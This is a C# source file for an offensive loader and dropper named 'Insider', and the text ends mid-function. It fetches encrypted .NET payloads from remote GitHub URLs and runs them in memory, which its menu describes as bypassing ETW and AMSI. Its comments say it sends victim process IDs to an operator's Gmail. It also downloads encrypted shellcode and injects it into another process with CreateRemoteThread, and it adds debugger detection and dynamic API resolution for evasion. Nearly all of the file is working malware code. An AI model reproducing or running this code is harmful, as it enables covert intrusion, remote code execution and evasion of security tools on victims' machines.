using System;
using System.Reflection;    // For loading .NET assembly in-memory
using System.Net;           // For usage of WebClient, to receive or send data
using System.Threading;     // For threading implementation
using System.Text;          // For string implmentation
using System.Security.Cryptography;     // For cryptographic AES implementation
using System.Security.Principal;        // For checking whether user is admin or not
using System.Runtime.InteropServices;   // For PInvoke
using System.IO;                        // For File Operation
using System.Diagnostics;              // For getting the process component of the currently active process

namespace Insider
{
    public class Program
    {
        // ========================= Thread Process(shellcode) Injection: Flags and Functions =====================

        // ==============================

        //getmodulehandle: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandleA(
        string module
        );

        //getprocaddress: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string funcName
        );

        // ================================

        // ========VIRTUALPROTECTEX=========
        /*
        //PInvoke
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
        */

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VPEx(
        IntPtr hProcess, 
        IntPtr lpAddress,
        UIntPtr dwSize, 
        uint flNewProtect, 
        out uint lpflOldProtect
        );

        // ========VIRTUALPROTECTEX=========

        // =============OPENPROCESS============
        /*
        //link c#: https://www.pinvoke.net/default.aspx/kernel32.openprocess
        //link msdn: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        //Getting processhandle of running remote target process
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,   // open flag: 0x1F0FFF (hexadecimal number) meaning, full-right open process.
        bool bInheritHandle,    // false | https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        uint dwProcessId        // From Gmail
        );
        */

        // source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr oprocess(
        uint dwDesiredAccess, 
        bool bInheritHandle, 
        uint dwProcessId
        );

        // ================OPENPROCESS=============

        // ==============VIRTUALALLOCEX=============
        /*
        //link c#: https://www.pinvoke.net/default.aspx/kernel32.virtualallocex
        //link msdn: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        //VirtualAllocEx lets you specify the address space in remote process
        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
        public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,        // target remote process handle     : OpenProcess()
        IntPtr lpAddress,       // remote process address pointer   : [in, optional] LPVOID lpAddress : As optional, So we will pass IntPtr.Zero (=null)
        uint dwSize,            // Shellcode length
        uint flAllocationType,
        uint flProtect
        );
        */
        
        // source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr vallocx(
        IntPtr hProcess,        // target remote process handle     : OpenProcess()
        IntPtr lpAddress,       // remote process address pointer   : [in, optional] LPVOID lpAddress : As optional, So we will pass IntPtr.Zero (=null)
        uint dwSize,            // Shellcode length
        uint flAllocationType,
        uint flProtect
        );

        // ==============VIRTUALALLOCEX=============

        // ==============WRITEPROCESSMEMORY============
        /*
        //link c#: https://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        //link msdn: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
        IntPtr hProcess,                    // HANDLE: msdn -> IntPtr: specterops (https://miro.medium.com/max/1400/1*dbSfTScP9KjXLkwoZPsmtw.png) -> IntPtr: klezvirus (https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/)
        IntPtr lpBaseAddress,               // LPVOID: msdn -> IntPtr: specterops -> IntPtr: klezvirus
        byte[] lpBuffer,                    // But!, LPCVOID: msdn -> void: specterops -> byte[]: klezvirus
        Int32 nSize,                        // But!, SIZE_T: msdn -> nothing!: specterops -> uint: klezvirus
        out IntPtr lpNumberOfBytesWritten   // But!, [out] SIZE_T  *: msdn -> nothing!: specterops -> UIntPtr: UIntPtr
        );
        
        // Marshal.Copy() not working....: see why.... 
        */

        // source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WPMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
        );

        // ==============WRITEPROCESSMEMORY============

        // ==============CREATEREMOTETHREAD============
        /*
        //link c#: https://www.pinvoke.net/default.aspx/kernel32.createremotethread
        //link msdn: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,                    // HANDLE: msdn -> IntPtr: specterops (https://miro.medium.com/max/1400/1*dbSfTScP9KjXLkwoZPsmtw.png) -> IntPtr: klezvirus (https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/)
        IntPtr lpThreadAttributes,          // LPSECURITY_ATTRIBUTES: msdn -> nothing!: specterops -> IntPtr: klezvirus
        uint dwStackSize,                   // SIZE_T: msdn -> nothing!: specterops -> uint: klezvirus
        IntPtr lpStartAddress,              // LPTHREAD_START_ROUTINE: msdn -> nothing!: specterops -> IntPtr: klezvirus
        IntPtr lpParameter,                 // LPVOID: msdn -> IntPtr: specterops -> IntPtr: klezvirus
        uint dwCreationFlags,               // DWORD: msdn -> ulong: specterops -> uint: klezvirus
        IntPtr lpThreadId                   // LPDWORD: msdn -> nothing!: specterops -> IntPtr: klezvirus
        );
        */

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CRThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
        );
        
        // ==============CREATEREMOTETHREAD============

        // ==============WAITFORSINGLEOBJECT===========
        /*
        // PInvoke
        [DllImport("kernel32")]
        public static extern UInt64 WaitForSingleObject(
        IntPtr hHandle,
        UInt64 dwMilliseconds
        );
        */

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt64 WFSO(
        IntPtr hHandle,
        UInt64 dwMilliseconds
        );

        // ==============WAITFORSINGLEOBJECT===========

        [Flags]
        public enum AllocationType
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x00002000
        }

        [Flags]
        public enum MemoryProtection
        {
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        // =============================================== Attached Debugger Detection: Flags and Functions ========================================

        // link: https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        // link: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
        // This above given documentation doesn't contain all enum members of PROCESSINFOCLASS.
        // visit: http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html      => It has other ones
        [Flags]
        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0x00,     // link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view | source: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
            ProcessDebugPort = 0x07,
            ProcessExceptionPort = 0x08,
            ProcessAccessToken = 0x09,
            ProcessWow64Information = 0x1A,
            ProcessImageFileName = 0x1B,
            ProcessDebugObjectHandle = 0x1E,
            ProcessDebugFlags = 0x1F,
            ProcessExecuteFlags = 0x22,
            ProcessInstrumentationCallback = 0x28,
            MaxProcessInfoClass = 0x64
        }

        /*
        [DllImport("kernel32.dll")]
        public static extern bool IsDebuggerPresent();
        */

        /*
        // For checking presence of debugger
        // PInvoke
        [DllImport("ntdll.dll")]
        public static extern int NtQueryInformationProcess(
        IntPtr processHandle, 
        int processInformationClass, 
        IntPtr processInformation, 
        uint processInformationLength, 
        ref uint returnLength // IntPtr
        );
        */

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Int32 NtQIP(
        IntPtr processHandle, 
        int processInformationClass, 
        IntPtr processInformation, 
        uint processInformationLength, 
        ref uint returnLength // IntPtr
        );

        // Performing Function Overloading


        // For detaching debugger from current process
        // We will need debugger handle
        // PInvoke
        /*
        [DllImport("ntdll.dll")]
        public static extern int NtQueryInformationProcess(
        IntPtr processHandle, 
        int processInformationClass, 
        ref IntPtr processInformation, // Changed to: ref 
        uint processInformationLength, 
        ref uint returnLength // IntPtr
        );
        */

        // With delegate function Overloading was not happening so I Changed function names

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Int32 NtQIP2(
        IntPtr processHandle, 
        int processInformationClass, 
        ref IntPtr processInformation, // Changed to: ref 
        uint processInformationLength, 
        ref uint returnLength // IntPtr
        );

        /*
        // link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html
        // For detaching debugger from current process
        // PInvoke
        [DllImport("ntdll.dll")]
        public static extern int NtRemoveProcessDebug(
        IntPtr ProcessHandle,
        IntPtr DebugObjectHandle
        );
        */

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Int32 NtRPD(
        IntPtr ProcessHandle,
        IntPtr DebugObjectHandle
        );


        // =================================================== DECRYPTION OPERATIONS ==============================================

        // Decryption keys:
        public static byte[] xor_key = Encoding.UTF8.GetBytes("mysecretkeee");          // Xor key      // change

        // global process id variable
        public static string pid = "";

        // Decrypting XOR:
        public static byte[] XOR_Decrypt(byte[] cipher)
        {
            byte[] unxored = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++)
            {
                unxored[i] = (byte)(cipher[i] ^ xor_key[i % xor_key.Length]);
            }

            //PasteToConsole(unxored);
            return unxored;
        }

        // Decrypting AES:
        public static byte[] AES_Decrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
        {
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipher, 0, cipher.Length);

                        //PasteToConsole(saltBytes);

                        cs.Close();
                    }

                    decryptedBytes = ms.ToArray();
                }
            }
            //PasteToConsole(decryptedBytes);        

            return decryptedBytes;
        }

        // Decryption: XOR -> AES
        // Convertion: aes_xor_byte -xor-> aes_byte -aes-> output (unencrypted) byte
        public static byte[] AES_XOR_Decrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
        {
            byte[] aes_byte = XOR_Decrypt(cipher);

            //Console.WriteLine("HERE: 146");
            byte[] rawshellcode = AES_Decrypt(aes_byte, saltBytes, passwordBytes);
            //Console.WriteLine("HERE: 148");
            
            return rawshellcode;
        }

        // Encryption: AES -> XOR -> B64
        // Convertion: b64_xor_aes_byte -aes-> b64_xor_byte -xor-> b64_byte -> b64_string -b64-> unencrypted byte
        public static byte[] AES_XOR_B64_Decrypt(string cipher, byte[] saltBytes, byte[] passwordBytes)
        {
            byte[] aes_xor_byte = Convert.FromBase64String(cipher);
            //Console.WriteLine("\nBase64 Decoding: ");
            //Console.WriteLine("------------------");
            //PasteToConsole(aes_xor_byte);

            byte[] rawshellcode = AES_XOR_Decrypt(aes_xor_byte, saltBytes, passwordBytes);

            return rawshellcode;
        }

        /*
        // For debugging purposes
        public static void PasteToConsole(byte[] encrypted)
        {

            Console.WriteLine("\n[+] Shellcode with \\x: ");
            Console.Write("\\x");
            Console.WriteLine(BitConverter.ToString(ba).Replace("-","\\x"));

            Console.WriteLine("\n[+] Shellcode with 0x: ");
            Console.Write("0x");
            Console.WriteLine(BitConverter.ToString(encrypted).Replace("-",", 0x"));
        }
        */

        public class Worker : MarshalByRefObject
        {
            // =================================================== LOADER OPERATIONS ==============================================

            // Actual Web Reflection:
            public byte[] WebReflect(string url, int retrycount, int timeoutTimer)
            {
                // Dealing with HTTPS requests
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                // Creating a Web Client to make web requests
                WebClient client = new WebClient();
                // Downloading byte array from the provided link via client web request.
                byte[] programBytes = null;

                int index = url.LastIndexOf("/");
                string trgtFile = url.Substring(index+1);

                while (retrycount >= 0 && programBytes == null)
                {
                    try
                    {
                        programBytes = client.DownloadData(url);
                    }
                    /* Unable to download assembly from url or if url server address is down, WebException is raised
                    link: https://docs.microsoft.com/en-us/dotnet/api/system.net.webexception.response?view=net-5.0
                    */
                    catch (WebException) //ex)
                    {
                        Console.Write("\n[!] '{0}' not found yet: [Exception raised!]\t=>\t[!] Please add '{0}' file in the Payload Server\t=>\t", trgtFile);

                        retrycount--;

                        Console.Write("[*] Sleeping for {0} seconds and retrying another {1} time...", timeoutTimer, retrycount); //, ex);
                        Thread.Sleep(timeoutTimer * 1000);
                    }
                }
                // If for some reason, assembly doesn't exist in the url, loader gracefully exits
                if (programBytes == null)
                {
                    Console.WriteLine("\n\n[-] '{0}' was not found, exiting now...", trgtFile);
                    Environment.Exit(-1);
                }
                return programBytes;
            }

            public static void Start(byte[] programBytes)
            {
                // Loading the assembly from byte array that was downloaded.
                Assembly dotNetProgram = Assembly.Load(programBytes);
                // Creates a new Object Array containing a new (empty) String Array
                Object[] parameters = new String[] { null };
                // Executes the entry point of the loaded assembly
                dotNetProgram.EntryPoint.Invoke(null, parameters);
            }


            // Loader is loading (Performing in-memory execution of .NET binary):
            public static void Loader(string arg)
            {
                if(arg.Equals("1.1"))
                {
                    CheckDebugger();

                    // Loading Assembly no 1: ETW and AMSI patch

                    Console.WriteLine("[>] Start? ");
                    Console.ReadKey();

                    Console.WriteLine("\n============LOADER==============");

                    AppDomain step1 = AppDomain.CreateDomain("step1");
                    Console.WriteLine("[+] Appdomain step1 created!");
                    
                    
                    Worker remoteWorker1 = (Worker)step1.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
                    
                    // cmd: "encrypt.exe /mscorliburl:https://github.com/reveng007/Executable_Files/raw/main/dotNETbinaries/mscorlib_nointeract.exe /out:aes_xor_b64"
                    string encryptedlink1 = "7EO9tbrDitekQwMHsvmPrz0OSkIr2clQDchJZPS7gqIVLmqnWKHFeoBSu/vCntUhTsW0yess5oQ1dsQjatmkVjnNm6l6RS3n9ve/DZguVhE7BeuTrlByhLpThIX7EpCD";

                    Console.WriteLine("[+] mscorlib URL Decryption Started... ");

                    // Only For AES Encryption (if required):
                    // salt and password for url:
                    byte[] url_saltBytes1 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };           // AES iv       // change
                    byte[] url_passwordBytes1 = Encoding.UTF8.GetBytes("word1");             // AES key      // change

                    byte[] url_bytes1 = AES_XOR_B64_Decrypt(encryptedlink1, url_saltBytes1, url_passwordBytes1);

                    string url1 = Encoding.UTF8.GetString(url_bytes1);

                    Console.WriteLine("[>] mscorlib.exe is reflectively loaded from: {0}\n", url1);

                    byte[] programBytes1 = remoteWorker1.WebReflect(url1, 0, 0);
                    Start(programBytes1);

                    Console.WriteLine("[+] Appdomain step1 Destroyed!");
                    AppDomain.Unload(step1);
                    Console.WriteLine("===============================\n");
                    //Console.ReadKey();

                    //==========================================================================NOTE===================================================================

                    // Loading Assembly no 2: Sending process ids from victim to Attacker machine via gmail, 
                    // after sending, this assembly exits.
                    // Then, this dropper keeps on trying to get a specific textfile from a certain url (different url).
                    // Once after successfully reading and getting the pid number from remote url, 
                    // Operator either have to hurry to create file and put in the `server url` in which dropper is listening or, have to give sufficent number of retry options,
                    // in order to suffice their requirement.
                    // The pid.txt (in remote url) will contain a pid number in it, to which process injection should happen.
                    // Most probably admin process (if the current process is running in a elevated state, to get a elevated shell!)

                    // With this we can make non-interractive program interractive, thereby maintaining stealth!

                    // Though smtp mailing thing should be a concern:   =>      But with InstallUtil.exe, it can reduced to some extent (probably..! ¯\_(ツ)_/¯)

                    //==========================================================================NOTE===================================================================

                    CheckDebugger();

                    Console.WriteLine("\n===============================");

                    AppDomain step2 = AppDomain.CreateDomain("step2");
                    Console.WriteLine("[+] Appdomain step2 created!");
                    //Console.ReadKey();

                    Worker remoteWorker2 = (Worker)step2.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

                    // cmd: .\encrypt.exe /remotewriteurl:<url-to-remotewrite.exe> /out:aes_xor_b64
                    string encryptedlink2 = "Changeit";

                    Console.WriteLine("[+] RemoteWrite URL Decryption Started... ");

                    // Only For AES Encryption (if required):
                    // salt and password for url:
                    byte[] url_saltBytes2 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };   // AES iv       // change
                    byte[] url_passwordBytes2 = Encoding.UTF8.GetBytes("word2");        // AES key      // change

                    byte[] url_bytes2 = AES_XOR_B64_Decrypt(encryptedlink2, url_saltBytes2, url_passwordBytes2);

                    string url2 = Encoding.UTF8.GetString(url_bytes2);

                    Console.WriteLine("[>] remotewrite.exe is reflectively loaded from: {0}\n", url2);

                    Console.Write("[*] Please Wait...");

                    byte[] programBytes2 = remoteWorker2.WebReflect(url2, 0, 0);
                    Start(programBytes2);

                    Console.WriteLine("     =>      Enumerated ProcessName and corresponding PIDs are to sent to Gmail!");

                    Console.WriteLine("[+] Appdomain step2 Destroyed!");
                    AppDomain.Unload(step2);
                    Console.WriteLine("===============================\n");
                    //Console.ReadKey();

                    CheckDebugger();

                    Console.WriteLine("\n===============================");

                    AppDomain step3 = AppDomain.CreateDomain("step3");
                    Console.WriteLine("[+] Appdomain step3 created!");

                    Worker remoteWorker3 = (Worker)step3.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

                    // cmd: .\encrypt.exe /remotereadurl:https://raw.githubusercontent.com/reveng007/Executable_Files/main/dotNETbinaries/pid.txt /out:aes_xor_b64
                    string encryptedlink3 = "57lhltXnKPCCDgbzsqb32DmBVQegaFHyBTWDpzaAdxxSPVGL/80ojUF2dKxz/Wode+p+wPjFhJoN9lCr+YNMVPLnAXvgLVsfTydAjWQ+ATCTiTtvUitwOqwb+GgMC0bB";

                    Console.WriteLine("\n[+] RemoteRead URL Decryption Started... ");

                    // Only For AES Encryption (if required):
                    // salt and password for url3:
                    byte[] url_saltBytes3 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };         // AES iv       // change
                    byte[] url_passwordBytes3 = Encoding.UTF8.GetBytes("word3");                         // AES key      // change

                    byte[] url_bytes3 = AES_XOR_B64_Decrypt(encryptedlink3, url_saltBytes3, url_passwordBytes3);

                    string url3 = Encoding.UTF8.GetString(url_bytes3);

                    Console.WriteLine("[+] RemoteRead URL: {0}", url3);

                    Console.WriteLine("[*] Trying to read specfied url: '{0}' until I get a PID to perform code injection!", url3);

                    // Creating Another client for reading data from remote, i.e. to get pid number to perform process injection
                    // Trying to fetch data from url, this process will continue till the Operators' mentioned retrycount and fetched data from remote is/becomes zero/null respectively.
                    byte[] programBytes3 = remoteWorker3.WebReflect(url3, 10, 20);      // Change it

                    Program.pid = Encoding.UTF8.GetString(programBytes3);

                    Console.WriteLine("\n\n[>] PID present on pid.txt on remote payload server : {0}", Program.pid);

                    Console.WriteLine("[+] Appdomain step3 Destroyed!");
                    AppDomain.Unload(step3);
                    Console.WriteLine("===============================\n");

                    Console.WriteLine("[>] Press any key");
                    Console.ReadKey();
                    
                }
                else if (arg.Equals("1.2"))
                {
                    CheckDebugger();

                    // Adding another appdomain, if you want to...

                    Console.Write("[>] Enter payload link to load: ");
                    string payload = Console.ReadLine();

                    Console.Write("[>] Name a/another AppDomain to create: ");
                    string appdomainname = Console.ReadLine();

                    AppDomain appdomains = AppDomain.CreateDomain(appdomainname);
                    Console.WriteLine("[+] Appdomain {0} created!", appdomainname);
                    Console.ReadKey();

                    Worker remoteWorker2 = (Worker)appdomains.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
                    remoteWorker2.WebReflect(payload, 0, 0);
                    Console.ReadKey();

                    Console.WriteLine("[+] Appdomain {0} Destroyed!", appdomainname);
                    AppDomain.Unload(appdomains);
                    Console.ReadKey();
                }
            }

           // ===================================== DROPPER OPERATIONS ====================================

            public static void Dropper(string arg)
            {

                string url4 = "";

                CheckDebugger();

                if(arg.Equals("2.1"))
                {
                    // mssgbox_x64
                    // mssgbox_x64: Encrypted

		    // Creating .bin file and Extracting shellcode from .bin file:
		    // Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
                    // Extract: 
		    // cmd: ".\encrypt.exe /file:file.bin /out:aes_xor_b64"
		    // paste the output b64 bytes into a .txt file and upload it to payload server.
		    // cmd: "mv .\obfuscator\"
		    // cmd: ".\encrypt.exe /shellcodeurl:<url-to-payloadserver-mssgbox_box.txt> /out:aes_xor_b64"
                    string encryptedurl4 = "See the above instruction";	// Change it

                    Console.WriteLine("\n================DROPPER==================");
                    Console.WriteLine("\n[+] Shellcode URL Decryption Started... ");

                    // Only For AES Encryption (if required):
                    // salt and password for url:
                    byte[] url_saltBytes4 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };         // AES iv       // change
                    byte[] url_passwordBytes4 = Encoding.UTF8.GetBytes("word4");              // AES key      // change

                    byte[] url_bytes4 = AES_XOR_B64_Decrypt(encryptedurl4, url_saltBytes4, url_passwordBytes4);

                    // Encoding.UTF8.GetString : Encoding.ASCII.GetString
                    url4 = Encoding.UTF8.GetString(url_bytes4);

                    Console.WriteLine("[+] URL: {0}", url4);
                }
                else
                {
                    Console.Write("[>] Enter shellcode link to download: ");
                    url4 = Console.ReadLine();

                    Console.WriteLine("[+] URL: {0}", url4);   
                }

                // Dealing with HTTPS requests
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                WebClient client = new WebClient();
                client.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";

                byte[] shellcode_download = client.DownloadData(url4);

                // Encoding.UTF8.GetString : Encoding.ASCII.GetString
                string encryptedshellcode = Encoding.UTF8.GetString(shellcode_download);

                Console.WriteLine("\n[+] Shellcode Decryption Started... ");

                // Only For AES Encryption (if required):
                // salt and password for shellcode:
                byte[] shellcode_saltBytes5 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 };         // AES iv       // change
                byte[] shellcode_passwordBytes5 = Encoding.UTF8.GetBytes("pass");            // AES key      // change

                // mssgbox_x64: AES-XOR-b64 decrypted
                byte[] shellcode = AES_XOR_B64_Decrypt(encryptedshellcode, shellcode_saltBytes5, shellcode_passwordBytes5);

                // Gettings remote process handle
                // PInvoke
                //IntPtr rphandle = OpenProcess(0x1F0FFF, false, Convert.ToUInt32(Program.pid));

                // delegates
                IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");
                oprocess op = (oprocess)Marshal.GetDelegateForFunctionPointer(funcaddr1, typeof(oprocess));
                IntPtr rphandle = op(0x1F0FFF, false, Convert.ToUInt32(Program.pid));

                Console.WriteLine("\n[+] Victim PID: {0}", Program.pid);

                // Allocating a buffer in remote process for payload
                // PInvoke
                //IntPtr createdBuffer = VirtualAllocEx(rphandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.MEM_COMMIT | (uint)AllocationType.MEM_RESERVE, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);

                // delegates
                IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");
                vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
                IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.MEM_COMMIT | (UInt32)AllocationType.MEM_RESERVE, (UInt32)MemoryProtection.PAGE_EXECUTE_READWRITE);
                
                //Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));

                //UInt64 ptr = &createdBuffer;
                //Console.WriteLine("\n[+] Allocated memory address: ", createdBuffer);
                //Console.WriteLine("\n[+] Injected Shellcode address (the value at the memory address): ", (*ptr));
                Console.WriteLine("[+] Allocated memory for the shellcode");

                // Copy shellcode to allocated buffer
                //Marshal.Copy(shellcode, 0, (IntPtr)(createdBuffer), shellcode.Length);
                IntPtr bytesWritten;
                //WriteProcessMemory(rphandle, createdBuffer, shellcode, shellcode.Length, out bytesWritten);

                // delegate
                IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");
                WPMemory wpmemory = (WPMemory)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(WPMemory));
                wpmemory(rphandle, createdBuffer, shellcode, Convert.ToInt32(shellcode.Length), out bytesWritten);

                Console.WriteLine("[+] Wrote Shellcode to the memory address");

                IntPtr hThread = IntPtr.Zero;

                //PInvoke
                //bool check = VirtualProtectEx(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);

                // delegate
                IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");
                VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
                bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);

                if(check == true)
                {
                    Console.WriteLine("[+] Permission of the memory region is RWX");
                }
                else
                {
                    Console.WriteLine("[-] Oops! Permission of the memory region isn't RWX");
                    System.Environment.Exit(1);
                }

                // If all good, launch the payload
                //hThread = CreateRemoteThread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);

                // delegate
                IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");
                CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));

                hThread = crthread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
                
                Console.WriteLine("[+] CreateRemoteThread() is called");

                if(hThread != IntPtr.Zero)
                {
                    // Waiting infinite amount of time for thread to exit
                    //PInvoke
                    //WaitForSingleObject(hThread, 0xFFFFFFFF);

                    // delegate
                    IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");
                    WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr6, typeof(WFSO));

                    wfso(hThread, 0xFFFFFFFF);

                    // Open New thread to continue with the prompt
                    Console.WriteLine("[+] Thread started successfully!");
                }
                else
                {
                    Console.WriteLine("[!] Unable to inject shellcode!!! ;(");
                }
            }            

            // Main Menu:

            public static string Banner()
            {
                CheckDebugger();

                Console.WriteLine("\n");
                Console.Write(@"[*] Choose serial number [1-4]: 
1. Loader
    1.1: Loader: Bypass ETW and AMSI => Fetches .NET payload from github.
                 Send Process Ids to Operator's gmail, From where Operator can pick a pid and add that to github
                 Implant will read from github to perform Process Injection 
    1.2: Loader: Use Custom payload via external url
2. Dropper
    2.1: Dropper: Use embeded shellcode url
    2.2: Dropper: Use Custom shellcode via external url (External Code designing is needed based on type of shellcode and url)
3. Loopper (Extracts shellcode from .NET payloads)
4. To exit
[>] ");
                string serialnum = Console.ReadLine();

                return serialnum;
            }

            public static void MainOperation()
            {
                CheckDebugger();

                string serialnum = Banner();

                if (serialnum.Equals("4"))
                {
                    System.Environment.Exit(1);
                }
                else if (serialnum.Equals("1"))
                {
                    Console.Write("[>] Enter Sub-options [1.1/1.2]: ");
                    string arg = Console.ReadLine();
                    Loader(arg);
                }
                else if(serialnum.Equals("2"))
                {
                    Console.Write("[>] Enter Sub-options [2.1/2.2]: ");
                    string arg = Console.ReadLine();
                    Dropper(arg);

                }
                else if(serialnum.Equals("3"))
                {
                    //Loopper();
                }
                else
                {
                    Console.WriteLine("[-] Wrong option!");
                    System.Environment.Exit(1);
                }
            }

            public static bool IsAdministrator()
            {
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }

            public static void CheckDebugger()
            {
                /*
                if (IsDebuggerPresent())
                {
